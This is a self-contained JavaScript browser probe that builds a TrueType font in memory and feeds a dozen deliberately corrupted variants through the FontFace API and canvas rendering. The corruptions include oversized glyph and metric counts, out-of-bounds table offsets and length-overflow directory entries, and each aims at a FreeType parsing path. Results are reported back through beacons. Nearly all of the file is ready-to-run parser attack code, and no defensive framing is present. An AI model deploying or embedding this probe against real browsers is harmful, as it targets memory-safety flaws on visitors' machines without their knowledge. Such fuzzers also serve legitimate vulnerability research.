// p180a — FontFace API font parsing probe
// Tests FreeType parsing of crafted TrueType font data via FontFace API
// Constructs minimal TTF in-memory, then corrupts specific fields
// Each corruption variant is tested separately with beacons
// Beacon prefix: V180A-

(function() {
  function B(tag, body) {
    try {
      var url = '/beacon/V180A-' + tag + '?t=' + Date.now();
      navigator.sendBeacon(url, body || '');
    } catch(e) {
      try { new Image().src = url; } catch(e2) {}
    }
  }

  B('BOOT');

  // Check FontFace API availability
  if (typeof FontFace === 'undefined') { B('NO-FONTFACE-API'); return; }
  B('API-OK');

  // Build minimal TrueType font binary
  // Required tables: cmap, glyf, head, hhea, hmtx, loca, maxp, name, post
  function buildMinimalTTF() {
    var numTables = 9;
    var headerSize = 12;
    var dirSize = numTables * 16;
    var tableStart = headerSize + dirSize;

    // Pre-build each table
    var tables = {};

    // head table (54 bytes)
    tables.head = new Uint8Array(54);
    var hv = new DataView(tables.head.buffer);
    hv.setUint32(0, 0x00010000);  // version
    hv.setUint32(4, 0x00005000);  // fontRevision
    hv.setUint32(8, 0x00000000);  // checksumAdj (placeholder)
    hv.setUint32(12, 0x5F0F3CF5); // magicNumber
    hv.setUint16(16, 0x000B);     // flags
    hv.setUint16(18, 1000);       // unitsPerEm
    // created/modified: 8 bytes each = 0
    hv.setInt16(36, 0);    // xMin
    hv.setInt16(38, 0);    // yMin
    hv.setInt16(40, 1000); // xMax
    hv.setInt16(42, 1000); // yMax
    hv.setUint16(44, 0);   // macStyle
    hv.setUint16(46, 8);   // lowestRecPPEM
    hv.setInt16(48, 2);    // fontDirectionHint
    hv.setInt16(50, 1);    // indexToLocFormat (long)
    hv.setInt16(52, 0);    // glyphDataFormat

    // maxp table (32 bytes for v1.0)
    tables.maxp = new Uint8Array(32);
    var mv = new DataView(tables.maxp.buffer);
    mv.setUint32(0, 0x00010000); // version 1.0
    mv.setUint16(4, 2);          // numGlyphs (notdef + space)
    mv.setUint16(6, 0);   // maxPoints
    mv.setUint16(8, 0);   // maxContours
    mv.setUint16(10, 0);  // maxCompositePoints
    mv.setUint16(12, 0);  // maxCompositeContours
    mv.setUint16(14, 1);  // maxZones
    mv.setUint16(16, 0);  // maxTwilightPoints
    mv.setUint16(18, 0);  // maxStorage
    mv.setUint16(20, 0);  // maxFunctionDefs
    mv.setUint16(22, 0);  // maxInstructionDefs
    mv.setUint16(24, 0);  // maxStackElements
    mv.setUint16(26, 0);  // maxSizeOfInstructions
    mv.setUint16(28, 0);  // maxComponentElements
    mv.setUint16(30, 0);  // maxComponentDepth

    // hhea table (36 bytes)
    tables.hhea = new Uint8Array(36);
    var hhv = new DataView(tables.hhea.buffer);
    hhv.setUint32(0, 0x00010000); // version
    hhv.setInt16(4, 800);   // ascender
    hhv.setInt16(6, -200);  // descender
    hhv.setInt16(8, 0);     // lineGap
    hhv.setUint16(10, 500); // advanceWidthMax
    hhv.setInt16(12, 0);    // minLeftSideBearing
    hhv.setInt16(14, 0);    // minRightSideBearing
    hhv.setInt16(16, 500);  // xMaxExtent
    hhv.setInt16(18, 1);    // caretSlopeRise
    hhv.setInt16(20, 0);    // caretSlopeRun
    hhv.setInt16(22, 0);    // caretOffset
    // 8 bytes reserved = 0
    hhv.setInt16(32, 0);    // metricDataFormat
    hhv.setUint16(34, 2);   // numberOfHMetrics

    // hmtx table (8 bytes = 2 * 4)
    tables.hmtx = new Uint8Array(8);
    var hmv = new DataView(tables.hmtx.buffer);
    hmv.setUint16(0, 500);  // glyph 0 advance
    hmv.setInt16(2, 0);     // glyph 0 lsb
    hmv.setUint16(4, 500);  // glyph 1 advance
    hmv.setInt16(6, 0);     // glyph 1 lsb

    // cmap table: format 4 (simplest useful format)
    var cmapData = [];
    // Header: version=0, numTables=1
    push16(cmapData, 0); push16(cmapData, 1);
    // Encoding record: platformID=3 (Windows), encodingID=1 (Unicode BMP), offset=12
    push16(cmapData, 3); push16(cmapData, 1); push32(cmapData, 12);
    // Format 4 subtable
    var segCount = 2; // one mapping + sentinel
    var searchRange = 4;
    push16(cmapData, 4);              // format
    push16(cmapData, 32);             // length
    push16(cmapData, 0);              // language
    push16(cmapData, segCount * 2);   // segCountX2
    push16(cmapData, searchRange);    // searchRange
    push16(cmapData, 1);              // entrySelector
    push16(cmapData, segCount * 2 - searchRange); // rangeShift
    // endCode
    push16(cmapData, 0x0020); // space
    push16(cmapData, 0xFFFF); // sentinel
    push16(cmapData, 0);      // reservedPad
    // startCode
    push16(cmapData, 0x0020);
    push16(cmapData, 0xFFFF);
    // idDelta
    push16(cmapData, -31 & 0xFFFF); // maps 0x20 to glyph 1
    push16(cmapData, 1);
    // idRangeOffset
    push16(cmapData, 0);
    push16(cmapData, 0);
    tables.cmap = new Uint8Array(cmapData);

    // loca table (long format, 3 entries for 2 glyphs)
    tables.loca = new Uint8Array(12);
    var lv = new DataView(tables.loca.buffer);
    lv.setUint32(0, 0);  // glyph 0 offset
    lv.setUint32(4, 0);  // glyph 1 offset (same = empty)
    lv.setUint32(8, 0);  // end sentinel

    // glyf table (empty — both glyphs have zero contours)
    tables.glyf = new Uint8Array(0);

    // post table (32 bytes, format 3.0 = no glyph names)
    tables.post = new Uint8Array(32);
    var pv = new DataView(tables.post.buffer);
    pv.setUint32(0, 0x00030000); // format 3.0
    pv.setUint32(4, 0);          // italicAngle
    pv.setInt16(8, -100);        // underlinePosition
    pv.setInt16(10, 50);         // underlineThickness
    pv.setUint32(12, 0);         // isFixedPitch

    // name table (minimal)
    var nameData = [];
    push16(nameData, 0);   // format
    push16(nameData, 4);   // count (4 name records)
    push16(nameData, 6 + 4 * 12); // stringOffset
    var nameStr = 'Fuzz';
    var nameBytes = [];
    for (var i = 0; i < nameStr.length; i++) {
      nameBytes.push(0); nameBytes.push(nameStr.charCodeAt(i));
    }
    var strOff = 0;
    // name records: platformID=3, encodingID=1, languageID=0x0409
    var nameIDs = [1, 2, 4, 6]; // family, subfamily, full, postscript
    for (var n = 0; n < nameIDs.length; n++) {
      push16(nameData, 3);         // platformID
      push16(nameData, 1);         // encodingID
      push16(nameData, 0x0409);    // languageID
      push16(nameData, nameIDs[n]); // nameID
      push16(nameData, nameBytes.length);  // length
      push16(nameData, strOff);    // offset
    }
    for (var i = 0; i < nameBytes.length; i++) nameData.push(nameBytes[i]);
    tables.name = new Uint8Array(nameData);

    return tables;
  }

  function push16(arr, val) {
    arr.push((val >> 8) & 0xFF);
    arr.push(val & 0xFF);
  }
  function push32(arr, val) {
    arr.push((val >> 24) & 0xFF);
    arr.push((val >> 16) & 0xFF);
    arr.push((val >> 8) & 0xFF);
    arr.push(val & 0xFF);
  }

  function tag2u32(s) {
    return (s.charCodeAt(0) << 24) | (s.charCodeAt(1) << 16) | (s.charCodeAt(2) << 8) | s.charCodeAt(3);
  }

  function calcChecksum(data) {
    var sum = 0;
    var nLongs = Math.floor((data.length + 3) / 4);
    var padded = new Uint8Array(nLongs * 4);
    padded.set(data);
    var dv = new DataView(padded.buffer);
    for (var i = 0; i < nLongs; i++) sum = (sum + dv.getUint32(i * 4)) >>> 0;
    return sum;
  }

  function assembleTTF(tables, corrupt) {
    var tags = ['cmap', 'glyf', 'head', 'hhea', 'hmtx', 'loca', 'maxp', 'name', 'post'];
    tags.sort();

    var numTables = tags.length;
    var headerSize = 12;
    var dirSize = numTables * 16;
    var offset = headerSize + dirSize;

    // Pad each table to 4-byte boundary
    var tablePadded = {};
    var totalSize = offset;
    for (var i = 0; i < tags.length; i++) {
      var t = tables[tags[i]];
      var padLen = (4 - (t.length % 4)) % 4;
      var padded = new Uint8Array(t.length + padLen);
      padded.set(t);
      tablePadded[tags[i]] = padded;
      totalSize += padded.length;
    }

    var buf = new ArrayBuffer(totalSize);
    var view = new DataView(buf);
    var u8 = new Uint8Array(buf);

    // sfnt header
    view.setUint32(0, 0x00010000);  // sfVersion
    view.setUint16(4, numTables);
    var sr = 1; while (sr * 2 <= numTables) sr *= 2; sr *= 16;
    view.setUint16(6, sr);
    var es = 0; var tmp = sr / 16; while (tmp > 1) { tmp >>= 1; es++; }
    view.setUint16(8, es);
    view.setUint16(10, numTables * 16 - sr);

    // Table directory + data
    var off = headerSize + dirSize;
    for (var i = 0; i < tags.length; i++) {
      var tag = tags[i];
      var raw = tables[tag];
      var padded = tablePadded[tag];

      // Directory entry
      var dirOff = headerSize + i * 16;
      view.setUint32(dirOff, tag2u32(tag));
      view.setUint32(dirOff + 4, calcChecksum(raw));
      view.setUint32(dirOff + 8, off);
      view.setUint32(dirOff + 12, raw.length);

      // Table data
      u8.set(padded, off);
      off += padded.length;
    }

    // Apply corruptions
    if (corrupt) corrupt(view, u8, buf, tags, headerSize);

    return buf;
  }

  // Test variants — each targets a different FreeType parsing path
  var tests = [
    {
      name: 'VALID',
      corrupt: null
    },
    {
      name: 'MAXP-HUGE-GLYPHS',
      // Set numGlyphs to 0xFFFF in maxp — forces FreeType to allocate huge arrays
      corrupt: function(view, u8, buf, tags, hs) {
        var maxpOff = findTableOffset(view, tags, hs, 'maxp');
        if (maxpOff >= 0) view.setUint16(maxpOff + 4, 0xFFFF);
      }
    },
    {
      name: 'HHEA-HUGE-HMETRICS',
      // Set numberOfHMetrics to 0xFFFF in hhea — makes FreeType read past hmtx
      corrupt: function(view, u8, buf, tags, hs) {
        var hheaOff = findTableOffset(view, tags, hs, 'hhea');
        if (hheaOff >= 0) view.setUint16(hheaOff + 34, 0xFFFF);
      }
    },
    {
      name: 'HEAD-BAD-LOCA-FMT',
      // Set indexToLocFormat to 0xFF — invalid format
      corrupt: function(view, u8, buf, tags, hs) {
        var headOff = findTableOffset(view, tags, hs, 'head');
        if (headOff >= 0) view.setInt16(headOff + 50, 0xFF);
      }
    },
    {
      name: 'CMAP-HUGE-SEGCOUNT',
      // Set segCountX2 to a huge value in cmap format 4
      corrupt: function(view, u8, buf, tags, hs) {
        var cmapOff = findTableOffset(view, tags, hs, 'cmap');
        if (cmapOff >= 0) {
          // Format 4 subtable starts at cmapOff + 12
          var f4off = cmapOff + 12;
          view.setUint16(f4off + 6, 0xFFFE); // segCountX2 = 0xFFFE
        }
      }
    },
    {
      name: 'LOCA-OOB-OFFSET',
      // Set glyph offset in loca to point way past glyf table
      corrupt: function(view, u8, buf, tags, hs) {
        var locaOff = findTableOffset(view, tags, hs, 'loca');
        if (locaOff >= 0) {
          view.setUint32(locaOff, 0x7FFFFFFF);
          view.setUint32(locaOff + 4, 0x7FFFFFFF);
        }
      }
    },
    {
      name: 'DIR-SIZE-OVERFLOW',
      // Set table length in directory to 0xFFFFFFFF — integer overflow in allocation
      corrupt: function(view, u8, buf, tags, hs) {
        // Corrupt the head table's length in the directory
        for (var i = 0; i < tags.length; i++) {
          if (tags[i] === 'head') {
            view.setUint32(hs + i * 16 + 12, 0xFFFFFFFF);
            break;
          }
        }
      }
    },
    {
      name: 'DIR-OFFSET-PAST-EOF',
      // Table offset points past end of font data
      corrupt: function(view, u8, buf, tags, hs) {
        for (var i = 0; i < tags.length; i++) {
          if (tags[i] === 'maxp') {
            view.setUint32(hs + i * 16 + 8, buf.byteLength + 0x10000);
            break;
          }
        }
      }
    },
    {
      name: 'MAXP-ZERO-GLYPHS',
      // numGlyphs = 0 — division by zero potential
      corrupt: function(view, u8, buf, tags, hs) {
        var maxpOff = findTableOffset(view, tags, hs, 'maxp');
        if (maxpOff >= 0) view.setUint16(maxpOff + 4, 0);
      }
    },
    {
      name: 'HEAD-BAD-MAGIC',
      // Corrupt magic number — see if FreeType still processes
      corrupt: function(view, u8, buf, tags, hs) {
        var headOff = findTableOffset(view, tags, hs, 'head');
        if (headOff >= 0) view.setUint32(headOff + 12, 0xDEADBEEF);
      }
    },
    {
      name: 'NUMTABLES-HUGE',
      // Corrupt sfnt header numTables to huge value
      corrupt: function(view, u8, buf, tags, hs) {
        view.setUint16(4, 0xFFFF); // numTables = 65535
      }
    },
    {
      name: 'HEAD-UPEM-ZERO',
      // unitsPerEm = 0 — division by zero in glyph scaling
      corrupt: function(view, u8, buf, tags, hs) {
        var headOff = findTableOffset(view, tags, hs, 'head');
        if (headOff >= 0) view.setUint16(headOff + 18, 0);
      }
    }
  ];

  function findTableOffset(view, tags, hs, tag) {
    for (var i = 0; i < tags.length; i++) {
      if (tags[i] === tag) return view.getUint32(hs + i * 16 + 8);
    }
    return -1;
  }

  var baseTables = buildMinimalTTF();
  B('TABLES-BUILT');

  var testIdx = 0;
  function runNext() {
    if (testIdx >= tests.length) {
      B('ALL-DONE-' + tests.length);
      return;
    }
    var test = tests[testIdx];
    var idx = testIdx;
    testIdx++;

    B('T' + idx + '-' + test.name);

    try {
      var buf = assembleTTF(baseTables, test.corrupt);
      var fontName = 'FuzzFont' + idx;

      var face = new FontFace(fontName, buf);
      face.load().then(function(loaded) {
        B('T' + idx + '-LOADED');
        document.fonts.add(loaded);

        // Try to render with the font to trigger glyph loading
        var el = document.createElement('span');
        el.style.fontFamily = fontName + ', serif';
        el.style.fontSize = '48px';
        el.textContent = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789';
        document.body.appendChild(el);

        // Force layout
        var w = el.offsetWidth;
        var h = el.offsetHeight;
        B('T' + idx + '-RENDER-' + w + 'x' + h);

        // Canvas render to force glyph rasterization
        try {
          var c = document.createElement('canvas');
          c.width = 400; c.height = 100;
          var ctx = c.getContext('2d');
          ctx.font = '48px ' + fontName;
          ctx.fillText('Test glyph render', 10, 60);
          B('T' + idx + '-CANVAS-OK');
        } catch(ce) {
          B('T' + idx + '-CANVAS-ERR-' + String(ce).substring(0, 30));
        }

        document.body.removeChild(el);
        document.fonts.delete(loaded);

        setTimeout(runNext, 50);
      }).catch(function(err) {
        B('T' + idx + '-REJECT-' + String(err).substring(0, 40));
        setTimeout(runNext, 50);
      });
    } catch(e) {
      B('T' + idx + '-ERR-' + String(e).substring(0, 40));
      setTimeout(runNext, 50);
    }
  }

  runNext();
})();
